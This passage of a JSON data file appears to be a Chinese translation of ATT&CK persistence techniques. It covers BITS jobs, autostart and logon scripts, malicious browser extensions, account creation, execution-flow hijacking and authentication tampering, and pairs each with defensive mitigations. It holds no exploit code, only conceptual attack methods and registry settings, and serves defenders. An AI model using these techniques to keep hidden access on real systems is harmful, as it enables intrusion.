                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用BITS作业来持续执行代码和执行各种后台任务。Windows后台智能传输服务（BITS）是一种通过组件对象模型（COM）公开的低带宽异步文件传输机制。BITS通常由更新程序、信使和其他应用程序使用，这些应用程序优选在后台操作（使用可用空闲带宽），而不会中断其他网络应用程序。文件传输任务被实现为BITS作业，BITS作业包含一个或多个文件操作的队列。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以通过PowerShell和BITSAdmin工具访问创建和管理BITS作业的接口。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用BITS来下载（例如，Ingress Tool Transfer）、执行，甚至在运行恶意代码后进行清理（例如，指标删除）。BITS任务在BITS作业数据库中是自包含的，没有新文件或注册表修改，并且通常由主机防火墙允许。启用BITS的执行还可以通过创建长期作业（默认最长生存期为90天且可扩展）或在作业完成或出现错误时调用任意程序（包括系统重新启动后）来启用持久性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "BITS上载功能也可用于通过替代协议执行Exfiltering。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "修改网络和/或主机防火墙规则以及其他网络控制，以仅允许合法的BITS流量。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑缩短组策略中的默认BITS作业生存期，或通过编辑"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS"
                        },
                        {
                            "type": "text",
                            "content": "中的"
                        },
                        {
                            "type": "code",
                            "content": "JobInactivityTimeout"
                        },
                        {
                            "type": "text",
                            "content": "和"
                        },
                        {
                            "type": "code",
                            "content": "MaxDownloadTime"
                        },
                        {
                            "type": "text",
                            "content": "注册表值。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑将BITS接口的访问权限限制为特定用户或组。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1547",
        "name": "Boot or Logon Autostart Execution",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
            },
            {
                "id": "T1547.002",
                "name": "Authentication Package"
            },
            {
                "id": "T1547.003",
                "name": "Time Providers"
            },
            {
                "id": "T1547.004",
                "name": "Winlogon Helper DLL"
            },
            {
                "id": "T1547.005",
                "name": "Security Support Provider"
            },
            {
                "id": "T1547.006",
                "name": "Kernel Modules and Extensions"
            },
            {
                "id": "T1547.007",
                "name": "Re-opened Applications"
            },
            {
                "id": "T1547.008",
                "name": "LSASS Driver"
            },
            {
                "id": "T1547.009",
                "name": "Shortcut Modification"
            },
            {
                "id": "T1547.010",
                "name": "Port Monitors"
            },
            {
                "id": "T1547.012",
                "name": "Print Processors"
            },
            {
                "id": "T1547.013",
                "name": "XDG Autostart Entries"
            },
            {
                "id": "T1547.014",
                "name": "Active Setup"
            },
            {
                "id": "T1547.015",
                "name": "Login Items"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以将系统设置配置为在系统引导或登录期间自动执行程序，以保持持久性或在受损系统上获得更高级别的权限。操作系统可以具有用于在系统引导或帐户登录时自动运行程序的机制。这些机制可能包括自动执行程序，这些程序被放置在专门指定的目录中，或者被存储配置信息的存储库（如Windows注册表）引用。对手可以通过修改或扩展内核的特性来实现相同的目标。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于某些启动或登录自动启动程序以更高的权限运行，对手可能会利用这些权限提升权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1037",
        "name": "Boot or Logon Initialization Scripts",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1037.001",
                "name": "Logon Script (Windows)"
            },
            {
                "id": "T1037.002",
                "name": "Login Hook"
            },
            {
                "id": "T1037.003",
                "name": "Network Logon Script"
            },
            {
                "id": "T1037.004",
                "name": "RC Scripts"
            },
            {
                "id": "T1037.005",
                "name": "Startup Items"
            }
        ],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用在启动或登录初始化时自动执行的脚本来建立持久性。初始化脚本可以用于执行管理功能，这些功能通常可以执行其他程序或将信息发送到内部日志服务器。这些脚本可以根据操作系统以及本地或远程应用而有所不同。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以使用这些脚本在单个系统上保持持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于某些启动或登录初始化脚本以更高的权限运行，因此对手也可以升级其权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将对登录脚本的写入权限限制为特定管理员。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保为注册表配置单元设置了适当的权限，以防止用户修改可能导致持久性的登录脚本的密钥。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1176",
        "name": "Browser Extensions",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能滥用互联网浏览器扩展来建立对受害者系统的持久访问。浏览器扩展或插件是小程序，可以添加功能并自定义Internet浏览器的各个方面。它们可以直接安装，也可以通过浏览器的应用商店安装，通常对浏览器可以访问的所有内容都有访问权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "恶意扩展可以通过伪装成合法扩展的恶意应用商店下载、通过社会工程或已经危害系统的对手安装到浏览器中。浏览器应用商店的安全性可能会受到限制，因此恶意扩展可能不难击败自动扫描仪。根据浏览器的不同，对手还可以操纵扩展的更新url以安装来自对手控制的服务器的更新，或者操纵移动配置文件以静默地安装其他扩展。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在macOS 11之前，对手可以使用"
                },
                {
                    "type": "code",
                    "content": "profiles"
                },
                {
                    "type": "text",
                    "content": "工具通过命令行静默安装浏览器扩展，以安装恶意的"
                },
                {
                    "type": "code",
                    "content": ".mobileconfig"
                },
                {
                    "type": "text",
                    "content": "文件。在macOS 11+中，使用"
                },
                {
                    "type": "code",
                    "content": "profiles"
                },
                {
                    "type": "text",
                    "content": "工具无法再安装配置文件，但可以通过用户交互植入和安装"
                },
                {
                    "type": "code",
                    "content": ".mobileconfig"
                },
                {
                    "type": "text",
                    "content": "文件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "一旦安装了扩展，它就可以在后台浏览到网站，窃取用户输入浏览器的所有信息（包括凭据），并用作RAT的安装程序以实现持久性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "也有僵尸网络通过恶意Chrome扩展使用持久后门的例子。也有类似的扩展用于命令和控制的例子。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保安装的扩展是预期的扩展，因为许多恶意扩展会伪装成合法的扩展。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据您的安全策略设置浏览器扩展允许或拒绝列表。"
                        }
                    ]
                ]
            },
            {
                "id": "M1033",
                "name": "限制软件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "仅安装来自可验证的可信来源的浏览器扩展。某些浏览器的浏览器扩展可以通过组策略进行控制。更改设置以防止浏览器在没有足够权限的情况下安装扩展。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保操作系统和浏览器使用的是最新版本。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "完成使用后关闭所有浏览器会话，以防止任何潜在的恶意扩展继续运行。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1554",
        "name": "Compromise Client Software Binary",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以修改客户端软件二进制文件，以建立对系统的持久访问。客户端软件使用户能够访问服务器提供的服务。常见的客户端软件类型有SSH客户端、FTP客户端、电子邮件客户端和web浏览器。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "当客户端软件二进制文件正在使用时，攻击者可能会对其进行修改，以执行恶意任务。例如，对手可能会复制客户端软件的源代码，添加后门，为目标进行编译，并用后门文件替换合法的应用程序二进制文件（或支持文件）。对手还可以在二进制文件合法执行之前通过修补恶意功能（例如IAT挂钩/入口点修补）来修改现有二进制文件。例如，对手可以在恢复正常执行流之前修改二进制的入口点，以指向对手修补的恶意代码。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于这些应用程序可能由用户常规执行，因此对手可以利用这一点对主机进行持久访问。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有应用程序组件二进制文件都由正确的应用程序开发人员签名。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1136",
        "name": "Create Account",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1136.001",
                "name": "Local Account"
            },
            {
                "id": "T1136.002",
                "name": "Domain Account"
            },
            {
                "id": "T1136.003",
                "name": "Cloud Account"
            }
        ],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会创建一个帐户来维护对受害者系统的访问。有了足够的访问级别，创建这样的帐户可以用于建立不需要在系统上部署持久远程访问工具的二级认证访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "帐户可以在本地系统上创建，也可以在域或云租户内创建。在云环境中，对手可能会创建只能访问特定服务的帐户，这可以减少被检测到的机会。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对用户和特权帐户使用多因素身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置访问控制和防火墙，以限制对用于创建和管理帐户的域控制器和系统的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过确保关键服务器的正确安全配置来保护域控制器。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制有权创建其他帐户的帐户数。不允许域管理员帐户用于日常操作，这可能会使它们暴露在非特权系统上的潜在对手面前。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1543",
        "name": "Create or Modify System Process",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1543.001",
                "name": "Launch Agent"
            },
            {
                "id": "T1543.002",
                "name": "Systemd Service"
            },
            {
                "id": "T1543.003",
                "name": "Windows Service"
            },
            {
                "id": "T1543.004",
                "name": "Launch Daemon"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "作为持久性的一部分，敌人可以创建或修改系统级进程，以重复执行恶意有效载荷。当操作系统启动时，它们可以启动执行后台系统功能的进程。在Windows和Linux上，这些系统进程被称为服务。在macOS上，运行名为Launch Daemon和Launch Agent的launchd进程来完成系统初始化并加载用户特定的参数。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会安装新的服务、守护进程或代理，这些服务、守护程序或代理可以配置为在启动时或可重复的时间间隔执行，以建立持久性。类似地，对手可能会修改现有的服务、守护程序或代理以达到相同的效果。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "服务、守护程序或代理可以使用管理员权限创建，但可以使用root/SYSTEM权限执行。敌人可能会利用此功能创建或修改系统流程，以提升权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用能够检测企业内系统上的特权和服务滥用机会并加以纠正的审核工具。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则，以防止应用程序将签名的易受攻击的驱动程序写入系统。在Windows 10和11上，启用Microsoft漏洞驱动程序阻止列表，以帮助加强对第三方开发的驱动程序的攻击。"
                        }
                    ]
                ]
            },
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在可能的情况下，只强制注册和执行合法签名的服务驱动程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1033",
                "name": "限制软件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "仅将软件安装限制在受信任的存储库中，并小心孤立的软件包。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保已启用驱动程序签名强制以限制未签名的驱动程序的安装。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将对系统级进程文件的读/写访问权限限制为仅选择有合法需要管理系统服务的特权用户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户和组的权限，以便只有经过授权的管理员才能与系统级流程更改和服务配置进行交互。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1546",
        "name": "Event Triggered Execution",
        "tactics": [
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1546.001",
                "name": "Change Default File Association"
            },
            {
                "id": "T1546.002",
                "name": "Screensaver"
            },
            {
                "id": "T1546.003",
                "name": "Windows Management Instrumentation Event Subscription"
            },
            {
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
            },
            {
                "id": "T1546.005",
                "name": "Trap"
            },
            {
                "id": "T1546.006",
                "name": "LC_LOAD_DYLIB Addition"
            },
            {
                "id": "T1546.007",
                "name": "Netsh Helper DLL"
            },
            {
                "id": "T1546.008",
                "name": "Accessibility Features"
            },
            {
                "id": "T1546.009",
                "name": "AppCert DLLs"
            },
            {
                "id": "T1546.010",
                "name": "AppInit DLLs"
            },
            {
                "id": "T1546.011",
                "name": "Application Shimming"
            },
            {
                "id": "T1546.012",
                "name": "Image File Execution Options Injection"
            },
            {
                "id": "T1546.013",
                "name": "PowerShell Profile"
            },
            {
                "id": "T1546.014",
                "name": "Emond"
            },
            {
                "id": "T1546.015",
                "name": "Component Object Model Hijacking"
            },
            {
                "id": "T1546.016",
                "name": "Installer Packages"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用基于特定事件触发执行的系统机制来建立持久性和/或提升特权。各种操作系统具有监视和订阅诸如登录之类的事件或诸如运行特定应用程序/二进制文件之类的其他用户活动的手段。云环境还可以支持各种功能和服务，这些功能和服务监视并可以响应于特定的云事件而被调用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "攻击者可能会滥用这些机制，通过重复执行恶意代码来保持对受害者的持久访问。在获得对受害者系统的访问权限后，对手可以创建/修改事件触发器，以指向每当调用事件触发器时将执行的恶意内容。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "由于执行可以由具有更高权限的帐户代理，例如SYSTEM或服务帐户，因此对手可能能够滥用这些触发的执行机制来提升其权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1133",
        "name": "External Remote Services",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以利用面向外部的远程服务来初始访问和/或在网络中持续存在。VPN、Citrix和其他访问机制等远程服务允许用户从外部位置连接到内部企业网络资源。通常有远程服务网关来管理这些服务的连接和凭据身份验证。Windows远程管理和VNC等服务也可以在外部使用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "访问有效帐户以使用该服务通常是一项要求，可以通过凭证制药或在破坏企业网络后从用户那里获得凭证来获得。对远程服务的访问可以用作操作期间的冗余或持久访问机制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "也可以通过不需要身份验证的公开服务获得访问权限。在容器化环境中，这可能包括公开的Docker API、Kubernetes API服务器、kubelet或web应用程序，如Kubernetesdashboard。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用或阻止可能不必要的远程可用服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制通过集中管理的集中器（如VPN和其他管理的远程访问系统）访问远程服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对远程服务帐户使用强大的双因素或多因素身份验证，以降低对手利用被盗凭据的能力，但要注意某些双因素身份验证实现的多因素身份拦截技术。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝通过使用网络代理、网关和防火墙直接远程访问内部系统。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1574",
        "name": "Hijack Execution Flow",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1574.001",
                "name": "DLL Search Order Hijacking"
            },
            {
                "id": "T1574.002",
                "name": "DLL Side-Loading"
            },
            {
                "id": "T1574.004",
                "name": "Dylib Hijacking"
            },
            {
                "id": "T1574.005",
                "name": "Executable Installer File Permissions Weakness"
            },
            {
                "id": "T1574.006",
                "name": "Dynamic Linker Hijacking"
            },
            {
                "id": "T1574.007",
                "name": "Path Interception by PATH Environment Variable"
            },
            {
                "id": "T1574.008",
                "name": "Path Interception by Search Order Hijacking"
            },
            {
                "id": "T1574.009",
                "name": "Path Interception by Unquoted Path"
            },
            {
                "id": "T1574.010",
                "name": "Services File Permissions Weakness"
            },
            {
                "id": "T1574.011",
                "name": "Services Registry Permissions Weakness"
            },
            {
                "id": "T1574.012",
                "name": "COR_PROFILER"
            },
            {
                "id": "T1574.013",
                "name": "KernelCallbackTable"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会通过劫持操作系统运行程序的方式来执行自己的恶意负载。劫持执行流可以用于持久性，因为这种被劫持的执行可能会随着时间的推移而再次发生。敌人也可能使用这些机制来提升特权或规避防御，例如应用程序控制或其他执行限制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以通过多种方式劫持执行流程，包括操纵操作系统如何定位要执行的程序。操作系统如何定位程序要使用的库也可以被截取。操作系统查找程序/资源的位置，如文件目录，以及在Windows的情况下的注册表，也可能被恶意负载毒害。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果可能，请在清单文件中包含哈希值，以帮助防止恶意库的副加载。"
                        }
                    ]
                ]
            },
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用能够检测企业内系统劫持机会并加以纠正的审计工具。像PowerSploit框架这样的工具包包含PowerUp模块，这些模块可用于探索系统的劫持弱点。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "使用Windows附带的程序sxstrace.exe以及手动检查来检查清单文件中的软件侧加载漏洞。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "在程序配置文件、脚本、path环境变量、服务和快捷方式中，通过在函数允许的情况下用引号包围path变量，查找并消除路径拦截弱点。请注意Windows执行或加载二进制文件时使用的搜索顺序，并在适当的情况下使用完全限定的路径。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "卸载软件时，请清理旧的Windows注册表项，以避免没有关联的合法二进制文件的注册表项。定期搜索、纠正或报告系统上的路径拦截弱点，这些弱点可能是使用自定义或可用工具引入的，这些工具报告使用不安全路径配置的软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些端点安全解决方案可以配置为基于常见的指示符序列（例如：特定API函数的执行）来阻止与进程注入/内存篡改相关的某些类型的行为。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "敌人可能会使用新的有效载荷来执行这项技术。通过使用同样能够阻止合法软件加载的库的应用程序控制解决方案，识别并阻止通过劫持执行的潜在恶意软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在写保护位置安装软件。在运行应用程序的文件夹和标准库文件夹中，设置目录访问控制以防止文件写入应用程序的搜索路径。"
                        }
                    ]
                ]
            },
            {
                "id": "M1044",
                "name": "限制库加载",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "不允许加载远程DLL。默认情况下，它包含在Windows Server 2012+中，并可通过XP+和Server 2003+的修补程序获得。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "启用安全DLL搜索模式，强制搜索具有更大限制的目录（例如"
                        },
                        {
                            "type": "code",
                            "content": "%SYSTEMROOT%"
                        },
                        {
                            "type": "text",
                            "content": "）中的系统DLL，以便在本地目录DLL（例如用户的主目录）之前使用"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "安全DLL搜索模式可以通过组策略在“计算机配置”>“[策略]”>“管理模板”>“MSS（旧版）:MSS:（SafeDllSearchMode）Enable Safe DLL Search Mode”中启用。相关的Windows注册表项位于"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode"
                        },
                        {
                            "type": "text",
                            "content": ""
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保为注册表配置单元设置了适当的权限，以防止用户修改可能导致权限提升的系统组件的密钥。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期更新软件，以包括修复DLL端加载漏洞的修补程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1052",
                "name": "用户帐户控制",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "关闭标准用户的UAC权限提升"
                        },
                        {
                            "type": "code",
                            "content": "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]"
                        },
                        {
                            "type": "text",
                            "content": "以自动拒绝提升请求，添加："
                        },
                        {
                            "type": "code",
                            "content": "“ConsentCompBehaviorUser”=dword:000000000"
                        },
                        {
                            "type": "text",
                            "content": "。考虑通过添加以下内容为所有用户启用安装程序检测："
                        },
                        {
                            "type": "code",
                            "content": "“EnableInstallerDetection”=dword:000000001"
                        },
                        {
                            "type": "text",
                            "content": "。这将提示输入安装密码，并记录尝试。要禁用安装程序检测，请添加："
                        },
                        {
                            "type": "code",
                            "content": "“EnableInstallerDetection”=dword:000000000"
                        },
                        {
                            "type": "text",
                            "content": "。这可能会防止在UAC检测安装程序的过程中利用漏洞提升权限，但会允许安装过程在不被记录的情况下继续进行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户和组的权限，以便只有经过授权的管理员才能与服务更改和服务二进制目标路径位置进行交互。在可能的情况下，拒绝从用户目录（如文件下载目录和临时目录）执行。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "确保设置了适当的权限和目录访问控制，以拒绝用户将文件写入顶级目录"
                        },
                        {
                            "type": "code",
                            "content": "C:"
                        },
                        {
                            "type": "text",
                            "content": "和系统目录（如"
                        },
                        {
                            "type": "code",
                            "content": "C:\\Windows\\"
                        },
                        {
                            "type": "text",
                            "content": "），从而减少恶意文件可能被放置执行的位置。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1525",
        "name": "Implant Internal Image",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会在访问环境后植入带有恶意代码的云或容器映像，以建立持久性。亚马逊网络服务（AWS）亚马逊机器图像（AMI）、谷歌云平台（GCP）图像和Azure图像以及Docker等流行的容器运行时都可以植入或后门。与上传恶意软件不同，这项技术专注于对手在受害者环境中的注册表中植入图像。根据基础设施的配置方式，如果指示基础设施配置工具始终使用最新映像，则可以提供持久访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "已经开发了一种工具来促进在云容器图像中植入后门。如果对手有权访问受损的AWS实例，并有权列出可用的容器映像，他们可能会植入后门，如Web Shell。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期检查云部署中使用的映像和容器的完整性，以确保它们没有被修改为包含恶意软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些云服务提供商支持内容信任模型，该模型要求容器映像由可信来源签名。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "基于最小权限原则限制与创建和修改平台映像或容器相关的权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1556",
        "name": "Modify Authentication Process",
        "tactics": [
            {
                "id": "TA0006",
                "name": "Credential Access"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1556.001",
                "name": "Domain Controller Authentication"
            },
            {
                "id": "T1556.002",
                "name": "Password Filter DLL"
            },
            {
                "id": "T1556.003",
                "name": "Pluggable Authentication Modules"
            },
            {
                "id": "T1556.004",
                "name": "Network Device Authentication"
            },
            {
                "id": "T1556.005",
                "name": "Reversible Encryption"
            },
            {
                "id": "T1556.006",
                "name": "Multi-Factor Authentication"
            },
            {
                "id": "T1556.007",
                "name": "Hybrid Identity"
            },
            {
                "id": "T1556.008",
                "name": "Network Provider DLL"
            }
        ],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会修改身份验证机制和过程以访问用户凭据，或以其他方式对帐户进行不必要的访问。身份验证过程由一些机制处理，如Windows上的本地安全身份验证服务器（LSASS）过程和安全帐户管理器（SAM），基于Unix的系统上的可插入身份验证模块（PAM），以及MacOS系统上负责收集、存储和验证凭据的授权插件。通过修改身份验证过程，对手可以在不使用有效帐户的情况下对服务或系统进行身份验证。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会恶意修改此过程的一部分，以显示凭据或绕过身份验证机制。泄露的凭证或访问可用于绕过网络内系统上各种资源上的访问控制，甚至可用于持久访问远程系统和外部可用服务，如VPN、Outlook Web access和远程桌面。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "审查身份验证日志，以确保MFA强制执行等机制按预期运行。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "定期检查正在使用的混合身份解决方案是否存在任何差异。例如，查看Azure管理门户中的所有直通身份验证（PTA）代理，以识别任何不需要或未批准的代理。如果正在使用ADFS，请检查AD FS和全局程序集缓存目录中的DLL和可执行文件，以确保它们由Microsoft签名。请注意，在某些情况下，二进制文件可能是经过目录签名的，这可能会导致在查看文件属性时文件显示为未签名。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "定期检查注册表中新的和未知的网络提供程序DLL（"
                        },
                        {
                            "type": "code",
